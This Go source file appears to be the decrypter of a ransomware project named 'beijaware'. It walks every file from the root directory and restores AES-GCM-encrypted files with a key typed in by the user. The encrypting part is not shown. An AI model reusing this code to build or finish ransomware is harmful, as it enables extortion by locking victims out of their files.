package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"strings"

	"github.com/dalbonip/beijaware/explorer"
)

func main() {
	dir := "/" // Insert starting directory

	fmt.Print("Decrypter \nInsert decrypt key:")

	reader := bufio.NewReader(os.Stdin)

	text, _ := reader.ReadString('\n')

	text = strings.Replace(text, "\n", "", -1)

	finalText := hex.EncodeToString([]byte(text))

	key, err := hex.DecodeString(finalText)
	if err != nil {
		fmt.Println(err, "Wrong key.")
	} else {

		files := explorer.MapFiles(dir)

		for _, v := range files {
			file, err := ioutil.ReadFile(v)
			if err != nil {
				log.Println("erro aqui: file, err := ioutil.ReadFile(v)")
				continue
			}

			decrypted, err := Decrypt(file, key)
			if err != nil {
				log.Println("erro aqui: decrypted, err := Decrypt(file, key)")
				continue
			}

			ioutil.WriteFile(v, decrypted, 0644)
		}

		fmt.Println("Files Decrypted.")
	}

	os.Exit(3)
}

func Decrypt(cypherText []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		log.Println("erro aqui: block, err := aes.NewCipher(key)")
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		log.Println("erro aqui: gcm, err := cipher.NewGCM(block)")
		return nil, err
	}

	plainText, err := gcm.Open(nil, cypherText[:gcm.NonceSize()], cypherText[gcm.NonceSize():], nil)
	if err != nil {
		log.Println("erro aqui: plainText, err := gcm.Open(nil, cypherText[:gcm.NonceSize()], cypherText[gcm.NonceSize():], nil)")
		return nil, err
	}

	return plainText, nil
}
